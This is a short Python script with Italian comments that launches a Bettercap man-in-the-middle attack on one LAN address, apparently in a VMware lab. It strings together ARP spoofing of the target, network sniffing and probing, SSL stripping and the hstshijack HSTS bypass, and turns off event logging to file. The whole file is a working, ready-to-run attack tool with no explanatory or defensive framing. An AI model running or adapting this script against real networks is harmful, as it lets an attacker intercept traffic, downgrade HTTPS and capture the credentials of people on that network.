import subprocess
import os

# --- CONFIGURAZIONE ---
INTERFACCIA = "eth0"   
TARGET_IP = "192.168.142.141"
HOST_VMWARE = "192.168.142.128"

# Comandi di avvio 
comandi = [
    f"set net.sniff.skip {HOST_VMWARE}",
    "events.ignore zeroconf.browsing",
    "events.ignore endpoint.new",
    "events.ignore endpoint.lost",
    #Disabilita salvataggio su file
    "set events.stream.output false",    
    "set http.proxy.sslstrip true",
    "hstshijack/hstshijack on",
    "net.probe on",
    "net.recon on",
    "net.sniff on",
    f"set arp.spoof.targets {TARGET_IP}",
    "arp.spoof on"
]


def avvia_attacco():
    stringa_avvio = "; ".join(comandi)
    
    print("=" * 50)
    print(f"[*] Avvio Bettercap su {INTERFACCIA}...")
    print(f"[*] Target: {TARGET_IP}")
    print("[!] Premi CTRL+C: Bettercap spegnerà i moduli e pulirà il terminale.")
    print("=" * 50)
    
    try:
        subprocess.run([
            "sudo", "bettercap", 
            "-iface", INTERFACCIA, 
            "-eval", stringa_avvio
        ])
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[-] ERRORE: Esegui con 'sudo'")
    else:
        avvia_attacco()
